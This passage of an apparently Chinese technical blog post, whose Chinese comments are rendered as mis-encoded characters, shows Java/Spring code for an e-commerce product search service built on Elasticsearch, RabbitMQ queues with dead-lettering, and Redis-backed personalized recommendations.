    <span class="hljs-keyword">private</span> Completion suggest;

    <span class="hljs-comment">// æ„å»ºæœç´¢å»ºè®®æ•°æ®</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">buildSuggest</span><span class="hljs-params">()</span> {
        <span class="hljs-built_in">this</span>.suggest = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Completion</span>(ImmutableMap.of(
                <span class="hljs-string">"input"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]{<span class="hljs-built_in">this</span>.name, <span class="hljs-built_in">this</span>.brand},
                <span class="hljs-string">"weight"</span>, <span class="hljs-number">1</span>
        ));
    }
}
</code></pre>
<h5 data-id="heading-11">1.2 æ ¸å¿ƒ DTO ä¸äº‹ä»¶æ¨¡å‹</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å•†å“DTO</span>
<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@Builder</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductDTO</span> {
    <span class="hljs-keyword">private</span> String id;
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> BigDecimal price;
    <span class="hljs-keyword">private</span> String imageUrl;
    <span class="hljs-keyword">private</span> String category;
    <span class="hljs-keyword">private</span> String brand;
    <span class="hljs-keyword">private</span> Long salesVolume;
    <span class="hljs-keyword">private</span> Float rating;
}

<span class="hljs-comment">// æœç´¢è¯·æ±‚å‚æ•°</span>
<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@Builder</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SearchRequest</span> {
    <span class="hljs-keyword">private</span> String keyword;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">page</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;
    <span class="hljs-keyword">private</span> String category;
    <span class="hljs-keyword">private</span> String sortField;
    <span class="hljs-keyword">private</span> String sortOrder;
    <span class="hljs-keyword">private</span> String userId;
}

<span class="hljs-comment">// å•†å“å˜æ›´äº‹ä»¶</span>
<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-meta">@NoArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductChangeEvent</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;
    <span class="hljs-keyword">private</span> String productId;
    <span class="hljs-keyword">private</span> Product product;
    <span class="hljs-keyword">private</span> EventType eventType; <span class="hljs-comment">// CREATE/UPDATE/DELETE</span>

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">EventType</span> {
        CREATE, UPDATE, DELETE
    }
}

<span class="hljs-comment">// ç”¨æˆ·è¡Œä¸ºäº‹ä»¶</span>
<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-meta">@NoArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserBehaviorEvent</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;
    <span class="hljs-keyword">private</span> String userId;
    <span class="hljs-keyword">private</span> String productId;
    <span class="hljs-keyword">private</span> String behaviorType; <span class="hljs-comment">// VIEW/BUY/COLLECT</span>
    <span class="hljs-keyword">private</span> String category;
    <span class="hljs-keyword">private</span> String brand;
    <span class="hljs-keyword">private</span> Date createTime;
}
</code></pre>
<h4 data-id="heading-12">2. RabbitMQ é…ç½®ï¼ˆæ ¸å¿ƒï¼‰</h4>
<p>å®ç°äº¤æ¢æœºã€é˜Ÿåˆ—ã€ç»‘å®šå…³ç³»é…ç½®ï¼Œä»¥åŠæ¶ˆæ¯ç”Ÿäº§è€… / æ¶ˆè´¹è€…æ¨¡æ¿ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RabbitMQConfig</span> {

    <span class="hljs-comment">// äº¤æ¢æœºåç§°</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">PRODUCT_EXCHANGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">"product.exchange"</span>;
    <span class="hljs-comment">// å•†å“åŒæ­¥é˜Ÿåˆ—</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">PRODUCT_SYNC_QUEUE</span> <span class="hljs-operator">=</span> <span class="hljs-string">"product.sync.queue"</span>;
    <span class="hljs-comment">// ç”¨æˆ·è¡Œä¸ºé˜Ÿåˆ—</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">USER_BEHAVIOR_QUEUE</span> <span class="hljs-operator">=</span> <span class="hljs-string">"user.behavior.queue"</span>;
    <span class="hljs-comment">// æ­»ä¿¡é˜Ÿåˆ—</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEAD_LETTER_QUEUE</span> <span class="hljs-operator">=</span> <span class="hljs-string">"dead.letter.queue"</span>;
    <span class="hljs-comment">// æ­»ä¿¡äº¤æ¢æœº</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEAD_LETTER_EXCHANGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">"dead.letter.exchange"</span>;

    <span class="hljs-comment">// 1. å£°æ˜äº¤æ¢æœºï¼ˆtopicç±»å‹ï¼Œæ”¯æŒè·¯ç”±é”®åŒ¹é…ï¼‰</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> TopicExchange <span class="hljs-title function_">productExchange</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// durable:æŒä¹…åŒ–ï¼ŒautoDelete:ä¸è‡ªåŠ¨åˆ é™¤</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TopicExchange</span>(PRODUCT_EXCHANGE, <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>);
    }

    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> TopicExchange <span class="hljs-title function_">deadLetterExchange</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TopicExchange</span>(DEAD_LETTER_EXCHANGE, <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>);
    }

    <span class="hljs-comment">// 2. å£°æ˜é˜Ÿåˆ—ï¼ˆå•†å“åŒæ­¥é˜Ÿåˆ—ï¼Œç»‘å®šæ­»ä¿¡äº¤æ¢æœºï¼‰</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">productSyncQueue</span><span class="hljs-params">()</span> {
        Map&lt;String, Object&gt; args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        <span class="hljs-comment">// ç»‘å®šæ­»ä¿¡äº¤æ¢æœº</span>
        args.put(<span class="hljs-string">"x-dead-letter-exchange"</span>, DEAD_LETTER_EXCHANGE);
        <span class="hljs-comment">// æ­»ä¿¡è·¯ç”±é”®</span>
        args.put(<span class="hljs-string">"x-dead-letter-routing-key"</span>, <span class="hljs-string">"sync.failed"</span>);
        <span class="hljs-comment">// æ¶ˆæ¯è¿‡æœŸæ—¶é—´ï¼ˆ10ç§’ï¼‰</span>
        args.put(<span class="hljs-string">"x-message-ttl"</span>, <span class="hljs-number">10000</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Queue</span>(PRODUCT_SYNC_QUEUE, <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, args);
    }

    <span class="hljs-comment">// ç”¨æˆ·è¡Œä¸ºé˜Ÿåˆ—</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">userBehaviorQueue</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Queue</span>(USER_BEHAVIOR_QUEUE, <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);
    }

    <span class="hljs-comment">// æ­»ä¿¡é˜Ÿåˆ—</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">deadLetterQueue</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Queue</span>(DEAD_LETTER_QUEUE, <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);
    }

    <span class="hljs-comment">// 3. ç»‘å®šå…³ç³»ï¼šäº¤æ¢æœº -&gt; å•†å“åŒæ­¥é˜Ÿåˆ—</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">productSyncBinding</span><span class="hljs-params">(Queue productSyncQueue, TopicExchange productExchange)</span> {
        <span class="hljs-keyword">return</span> BindingBuilder.bind(productSyncQueue)
                .to(productExchange)
                .with(<span class="hljs-string">"product.sync"</span>); <span class="hljs-comment">// è·¯ç”±é”®</span>
    }

    <span class="hljs-comment">// ç»‘å®šå…³ç³»ï¼šäº¤æ¢æœº -&gt; ç”¨æˆ·è¡Œä¸ºé˜Ÿåˆ—</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">userBehaviorBinding</span><span class="hljs-params">(Queue userBehaviorQueue, TopicExchange productExchange)</span> {
        <span class="hljs-keyword">return</span> BindingBuilder.bind(userBehaviorQueue)
                .to(productExchange)
                .with(<span class="hljs-string">"user.behavior"</span>); <span class="hljs-comment">// è·¯ç”±é”®</span>
    }

    <span class="hljs-comment">// ç»‘å®šå…³ç³»ï¼šæ­»ä¿¡äº¤æ¢æœº -&gt; æ­»ä¿¡é˜Ÿåˆ—</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">deadLetterBinding</span><span class="hljs-params">(Queue deadLetterQueue, TopicExchange deadLetterExchange)</span> {
        <span class="hljs-keyword">return</span> BindingBuilder.bind(deadLetterQueue)
                .to(deadLetterExchange)
                .with(<span class="hljs-string">"sync.failed"</span>); <span class="hljs-comment">// æ­»ä¿¡è·¯ç”±é”®</span>
    }

    <span class="hljs-comment">// 4. æ¶ˆæ¯ç”Ÿäº§è€…æ¨¡æ¿ï¼ˆJSONåºåˆ—åŒ–ï¼‰</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> RabbitTemplate <span class="hljs-title function_">rabbitTemplate</span><span class="hljs-params">(ConnectionFactory connectionFactory)</span> {
        <span class="hljs-type">RabbitTemplate</span> <span class="hljs-variable">rabbitTemplate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RabbitTemplate</span>(connectionFactory);
        <span class="hljs-comment">// æ¶ˆæ¯åºåˆ—åŒ–æ–¹å¼ï¼šJSON</span>
        rabbitTemplate.setMessageConverter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Jackson2JsonMessageConverter</span>());
        <span class="hljs-comment">// å¼€å¯ç¡®è®¤æœºåˆ¶ï¼ˆç¡®ä¿æ¶ˆæ¯åˆ°è¾¾äº¤æ¢æœºï¼‰</span>
        rabbitTemplate.setConfirmCallback((correlationData, ack, cause) -&gt; {
            <span class="hljs-keyword">if</span> (!ack) {
                log.error(<span class="hljs-string">"æ¶ˆæ¯å‘é€è‡³äº¤æ¢æœºå¤±è´¥ï¼Œcause: {}"</span>, cause);
            }
        });
        <span class="hljs-comment">// å¼€å¯è¿”å›æœºåˆ¶ï¼ˆç¡®ä¿æ¶ˆæ¯åˆ°è¾¾é˜Ÿåˆ—ï¼‰</span>
        rabbitTemplate.setReturnsCallback(returned -&gt; {
            log.error(<span class="hljs-string">"æ¶ˆæ¯å‘é€è‡³é˜Ÿåˆ—å¤±è´¥ï¼ŒroutingKey: {}, replyText: {}"</span>,
                    returned.getRoutingKey(), returned.getReplyText());
        });
        <span class="hljs-keyword">return</span> rabbitTemplate;
    }

    <span class="hljs-comment">// 5. æ¶ˆæ¯æ¶ˆè´¹è€…é…ç½®ï¼ˆJSONååºåˆ—åŒ–ï¼‰</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> SimpleRabbitListenerContainerFactory <span class="hljs-title function_">rabbitListenerContainerFactory</span><span class="hljs-params">(ConnectionFactory connectionFactory)</span> {
        <span class="hljs-type">SimpleRabbitListenerContainerFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleRabbitListenerContainerFactory</span>();
        factory.setConnectionFactory(connectionFactory);
        factory.setMessageConverter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Jackson2JsonMessageConverter</span>());
        <span class="hljs-comment">// å¹¶å‘æ¶ˆè´¹è€…æ•°é‡</span>
        factory.setConcurrentConsumers(<span class="hljs-number">3</span>);
        factory.setMaxConcurrentConsumers(<span class="hljs-number">5</span>);
        <span class="hljs-comment">// æ¯æ¬¡æ‹‰å–æ¶ˆæ¯æ•°é‡</span>
        factory.setPrefetchCount(<span class="hljs-number">10</span>);
        <span class="hljs-keyword">return</span> factory;
    }
}
</code></pre>
<h4 data-id="heading-13">3. å•†å“æœç´¢æœåŠ¡å®ç°</h4>
<h5 data-id="heading-14">3.1 æœç´¢æ¥å£æ§åˆ¶å™¨</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/api/search")</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductSearchController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ProductSearchService productSearchService;

    <span class="hljs-comment">/**
     * å•†å“æœç´¢æ¥å£ï¼ˆæ”¯æŒå…³é”®è¯ã€åˆ†ç±»ã€æ’åºï¼‰
     */</span>
    <span class="hljs-meta">@GetMapping("/products")</span>
    <span class="hljs-keyword">public</span> Result&lt;PageResult&lt;ProductDTO&gt;&gt; <span class="hljs-title function_">searchProducts</span><span class="hljs-params">(
            <span class="hljs-meta">@RequestParam</span> String keyword,
            <span class="hljs-meta">@RequestParam(defaultValue = "0")</span> <span class="hljs-type">int</span> page,
            <span class="hljs-meta">@RequestParam(defaultValue = "20")</span> <span class="hljs-type">int</span> size,
            <span class="hljs-meta">@RequestParam(required = false)</span> String category,
            <span class="hljs-meta">@RequestParam(required = false)</span> String sortField,
            <span class="hljs-meta">@RequestParam(required = false)</span> String sortOrder,
            HttpServletRequest request)</span> {
        
        <span class="hljs-comment">// ä»è¯·æ±‚å¤´è·å–ç”¨æˆ·IDï¼ˆç”¨äºä¸ªæ€§åŒ–æ¨èï¼‰</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">"X-User-ID"</span>);

        <span class="hljs-comment">// æ„å»ºæœç´¢è¯·æ±‚å‚æ•°</span>
        <span class="hljs-type">SearchRequest</span> <span class="hljs-variable">requestParams</span> <span class="hljs-operator">=</span> SearchRequest.builder()
                .keyword(keyword)
                .page(page)
                .size(size)
                .category(category)
                .sortField(sortField)
                .sortOrder(sortOrder)
                .userId(userId)
                .build();

        <span class="hljs-comment">// æ‰§è¡Œæœç´¢</span>
        PageResult&lt;ProductDTO&gt; result = productSearchService.search(requestParams);
        <span class="hljs-keyword">return</span> Result.success(result);
    }

    <span class="hljs-comment">/**
     * æœç´¢å»ºè®®æ¥å£ï¼ˆè‡ªåŠ¨è¡¥å…¨ï¼‰
     */</span>
    <span class="hljs-meta">@GetMapping("/suggest")</span>
    <span class="hljs-keyword">public</span> Result&lt;List&lt;String&gt;&gt; <span class="hljs-title function_">getSearchSuggestions</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String keyword)</span> {
        List&lt;String&gt; suggestions = productSearchService.getSuggestions(keyword);
        <span class="hljs-keyword">return</span> Result.success(suggestions);
    }
}
</code></pre>
<h5 data-id="heading-15">3.2 æœç´¢æœåŠ¡æ ¸å¿ƒé€»è¾‘</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductSearchService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ElasticsearchRestTemplate elasticsearchTemplate;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedisTemplate&lt;String, Object&gt; redisTemplate;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ProductRecommendationService recommendationService;

    <span class="hljs-comment">/**
     * æ‰§è¡Œå•†å“æœç´¢ï¼ˆæ£€ç´¢+ä¸ªæ€§åŒ–æ¨èï¼‰
     */</span>
    <span class="hljs-keyword">public</span> PageResult&lt;ProductDTO&gt; <span class="hljs-title function_">search</span><span class="hljs-params">(SearchRequest request)</span> {
        <span class="hljs-comment">// 1. æ„å»ºElasticsearchæŸ¥è¯¢æ¡ä»¶</span>
        <span class="hljs-type">NativeSearchQuery</span> <span class="hljs-variable">searchQuery</span> <span class="hljs-operator">=</span> buildSearchQuery(request);

        <span class="hljs-comment">// 2. æ‰§è¡ŒESæœç´¢</span>
        SearchHits&lt;ProductDocument&gt; searchHits = elasticsearchTemplate.search(
                searchQuery, ProductDocument.class);

        <span class="hljs-comment">// 3. è½¬æ¢æœç´¢ç»“æœä¸ºDTO</span>
        List&lt;ProductDTO&gt; productList = searchHits.getSearchHits().stream()
                .map(hit -&gt; convertToProductDTO(hit.getContent()))
                .collect(Collectors.toList());

        <span class="hljs-comment">// 4. å¯¹ç™»å½•ç”¨æˆ·åº”ç”¨ä¸ªæ€§åŒ–æ¨èï¼ˆæ··åˆæœç´¢ç»“æœä¸æ¨èç»“æœï¼‰</span>
        <span class="hljs-keyword">if</span> (StringUtils.hasText(request.getUserId())) {
            productList = recommendationService.personalizeProducts(productList, request.getUserId());
        }

        <span class="hljs-comment">// 5. è®°å½•æœç´¢æŒ‡æ ‡ï¼ˆç”¨äºçƒ­é—¨æœç´¢è¯åˆ†æï¼‰</span>
        recordSearchMetrics(request.getKeyword(), productList.size());

        <span class="hljs-comment">// 6. æ„å»ºåˆ†é¡µç»“æœ</span>
        <span class="hljs-keyword">return</span> PageResult.&lt;ProductDTO&gt;builder()
                .data(productList)
                .total(searchHits.getTotalHits())
                .page(request.getPage())
                .size(request.getSize())
                .build();
    }

    <span class="hljs-comment">/**
     * æ„å»ºESæœç´¢æŸ¥è¯¢ï¼ˆå¤šå­—æ®µ+è¿‡æ»¤+æ’åºï¼‰
     */</span>
    <span class="hljs-keyword">private</span> NativeSearchQuery <span class="hljs-title function_">buildSearchQuery</span><span class="hljs-params">(SearchRequest request)</span> {
        <span class="hljs-type">BoolQueryBuilder</span> <span class="hljs-variable">boolQuery</span> <span class="hljs-operator">=</span> QueryBuilders.boolQuery();

        <span class="hljs-comment">// å…³é”®è¯æœç´¢ï¼šå¤šå­—æ®µåŒ¹é…ï¼ˆåç§°æƒé‡3ï¼Œæè¿°æƒé‡2ï¼Œå“ç‰Œ/åˆ†ç±»æƒé‡1ï¼‰</span>
        <span class="hljs-keyword">if</span> (StringUtils.hasText(request.getKeyword())) {
            <span class="hljs-type">MultiMatchQueryBuilder</span> <span class="hljs-variable">multiMatchQuery</span> <span class="hljs-operator">=</span> QueryBuilders.multiMatchQuery(
                    request.getKeyword(),
                    <span class="hljs-string">"name^3"</span>,  <span class="hljs-comment">// å•†å“åç§°æƒé‡æœ€é«˜</span>
                    <span class="hljs-string">"description^2"</span>,
                    <span class="hljs-string">"brand"</span>,
                    <span class="hljs-string">"category"</span>
            ).type(MultiMatchQueryBuilder.Type.BEST_FIELDS)
             .fuzziness(Fuzziness.AUTO); <span class="hljs-comment">// æ”¯æŒæ¨¡ç³Šæœç´¢ï¼ˆå®¹é”™è¾“å…¥é”™è¯¯ï¼‰</span>
            boolQuery.must(multiMatchQuery);
        }

        <span class="hljs-comment">// åˆ†ç±»è¿‡æ»¤</span>
        <span class="hljs-keyword">if</span> (StringUtils.hasText(request.getCategory())) {
            boolQuery.filter(QueryBuilders.termQuery(<span class="hljs-string">"category.keyword"</span>, request.getCategory()));
        }

        <span class="hljs-comment">// æ„å»ºæŸ¥è¯¢æ„å»ºå™¨</span>
        <span class="hljs-type">NativeSearchQueryBuilder</span> <span class="hljs-variable">queryBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeSearchQueryBuilder</span>()
                .withQuery(boolQuery)
                .withPageable(PageRequest.of(request.getPage(), request.getSize()));

        <span class="hljs-comment">// æ’åºé…ç½®ï¼ˆä¼˜å…ˆæŒ‰ç”¨æˆ·æŒ‡å®šå­—æ®µæ’åºï¼Œé»˜è®¤æŒ‰ç›¸å…³æ€§æ’åºï¼‰</span>
        <span class="hljs-keyword">if</span> (StringUtils.hasText(request.getSortField())) {
            <span class="hljs-type">SortOrder</span> <span class="hljs-variable">sortOrder</span> <span class="hljs-operator">=</span> <span class="hljs-string">"desc"</span>.equalsIgnoreCase(request.getSortOrder()) 
                    ? SortOrder.DESC : SortOrder.ASC;
            queryBuilder.withSort(SortBuilders.fieldSort(request.getSortField()).order(sortOrder));
        } <span class="hljs-keyword">else</span> {
            queryBuilder.withSort(SortBuilders.scoreSort().order(SortOrder.DESC));
        }

        <span class="hljs-keyword">return</span> queryBuilder.build();
    }

    <span class="hljs-comment">/**
     * è·å–æœç´¢å»ºè®®ï¼ˆåŸºäºESçš„Completion Suggesterï¼‰
     */</span>
    <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">getSuggestions</span><span class="hljs-params">(String keyword)</span> {
        <span class="hljs-comment">// æ„å»ºæœç´¢å»ºè®®å™¨</span>
        <span class="hljs-type">CompletionSuggestionBuilder</span> <span class="hljs-variable">suggestionBuilder</span> <span class="hljs-operator">=</span> SuggestBuilders
                .completionSuggestion(<span class="hljs-string">"suggest"</span>)
                .prefix(keyword)
                .size(<span class="hljs-number">10</span>); <span class="hljs-comment">// è¿”å›Top10å»ºè®®</span>

        <span class="hljs-comment">// æ„å»ºå»ºè®®è¯·æ±‚</span>
        <span class="hljs-type">SuggestBuilder</span> <span class="hljs-variable">suggestBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SuggestBuilder</span>()
                .addSuggestion(<span class="hljs-string">"product_suggest"</span>, suggestionBuilder);

        <span class="hljs-type">SearchRequest</span> <span class="hljs-variable">searchRequest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SearchRequest</span>(<span class="hljs-string">"products"</span>);
        searchRequest.source(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SearchSourceBuilder</span>().suggest(suggestBuilder));

        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// æ‰§è¡Œå»ºè®®æŸ¥è¯¢</span>
            <span class="hljs-type">SearchResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> elasticsearchTemplate.getElasticsearchRestClient()
                    .search(searchRequest, RequestOptions.DEFAULT);

            <span class="hljs-comment">// è§£æå»ºè®®ç»“æœ</span>
            <span class="hljs-type">Suggest</span> <span class="hljs-variable">suggest</span> <span class="hljs-operator">=</span> response.getSuggest();
            <span class="hljs-type">CompletionSuggestion</span> <span class="hljs-variable">suggestion</span> <span class="hljs-operator">=</span> suggest.getSuggestion(<span class="hljs-string">"product_suggest"</span>);
            <span class="hljs-keyword">return</span> suggestion.getEntries().stream()
                    .flatMap(entry -&gt; entry.getOptions().stream())
                    .map(option -&gt; option.getText().toString())
                    .collect(Collectors.toList());
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"è·å–æœç´¢å»ºè®®å¤±è´¥ï¼Œkeyword: {}"</span>, keyword, e);
            <span class="hljs-keyword">return</span> Collections.emptyList();
        }
    }

    <span class="hljs-comment">// è¾…åŠ©æ–¹æ³•ï¼šè®°å½•æœç´¢æŒ‡æ ‡ã€DTOè½¬æ¢ï¼ˆç•¥ï¼ŒåŒå‰æ–‡Kafkaæ–¹æ¡ˆï¼‰</span>
}
</code></pre>
<h4 data-id="heading-16">4. ä¸ªæ€§åŒ–æ¨èæœåŠ¡å®ç°</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductRecommendationService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedisTemplate&lt;String, Object&gt; redisTemplate;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ElasticsearchRestTemplate elasticsearchTemplate;

    <span class="hljs-comment">/**
     * ä¸ªæ€§åŒ–å•†å“æ¨èï¼ˆæ··åˆååŒè¿‡æ»¤+å†…å®¹æ¨èï¼‰
     */</span>
    <span class="hljs-keyword">public</span> List&lt;ProductDTO&gt; <span class="hljs-title function_">personalizeProducts</span><span class="hljs-params">(List&lt;ProductDTO&gt; baseProducts, String userId)</span> {
        <span class="hljs-comment">// 1. è·å–ç”¨æˆ·è¡Œä¸ºå†å²ï¼ˆä¼˜å…ˆä»Redisç¼“å­˜è·å–ï¼‰</span>
        List&lt;UserBehaviorEvent&gt; userBehaviors = getUserBehaviors(userId);
        <span class="hljs-keyword">if</span> (userBehaviors.isEmpty()) {
            <span class="hljs-keyword">return</span> baseProducts; <span class="hljs-comment">// æ— è¡Œä¸ºæ•°æ®æ—¶ç›´æ¥è¿”å›æœç´¢ç»“æœ</span>
        }

        <span class="hljs-comment">// 2. ååŒè¿‡æ»¤æ¨èï¼šåŸºäºç›¸ä¼¼ç”¨æˆ·çš„åå¥½æ¨è</span>
        List&lt;String&gt; cfRecommendIds = collaborativeFilteringRecommend(userId, userBehaviors);

        <span class="hljs-comment">// 3. å†…å®¹æ¨èï¼šåŸºäºç”¨æˆ·åå¥½çš„åˆ†ç±»/å“ç‰Œæ¨è</span>
        List&lt;String&gt; contentRecommendIds = contentBasedRecommend(userBehaviors);

        <span class="hljs-comment">// 4. åˆå¹¶æ¨èç»“æœï¼ˆå»é‡ï¼Œä¿æŒé¡ºåºï¼‰</span>
        Set&lt;String&gt; allRecommendIds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashSet</span>&lt;&gt;();
        allRecommendIds.addAll(cfRecommendIds);
        allRecommendIds.addAll(contentRecommendIds);

        <span class="hljs-comment">// 5. è·å–æ¨èå•†å“è¯¦æƒ…</span>
        List&lt;ProductDTO&gt; recommendProducts = getProductDetails(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(allRecommendIds));

        <span class="hljs-comment">// 6. æ··åˆæœç´¢ç»“æœä¸æ¨èç»“æœï¼ˆå»é‡ï¼Œé™åˆ¶æ€»æ•°50ï¼‰</span>
        <span class="hljs-keyword">return</span> blendSearchAndRecommendations(baseProducts, recommendProducts);
    }

    <span class="hljs-comment">/**
     * ä»Redisè·å–ç”¨æˆ·è¡Œä¸ºå†å²ï¼ˆç”±RabbitMQæ¶ˆè´¹ç«¯å†™å…¥ï¼‰
     */</span>
    <span class="hljs-keyword">private</span> List&lt;UserBehaviorEvent&gt; <span class="hljs-title function_">getUserBehaviors</span><span class="hljs-params">(String userId)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">cacheKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"user:behaviors:"</span> + userId;
        <span class="hljs-type">Object</span> <span class="hljs-variable">cachedBehaviors</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().get(cacheKey);
        
        <span class="hljs-keyword">if</span> (cachedBehaviors != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> (List&lt;UserBehaviorEvent&gt;) cachedBehaviors;
        }

        <span class="hljs-comment">// ç¼“å­˜æœªå‘½ä¸­ï¼Œä»æ•°æ®åº“åŠ è½½ï¼ˆå®é™…é¡¹ç›®ä¸­å®ç°DBæŸ¥è¯¢é€»è¾‘ï¼‰</span>
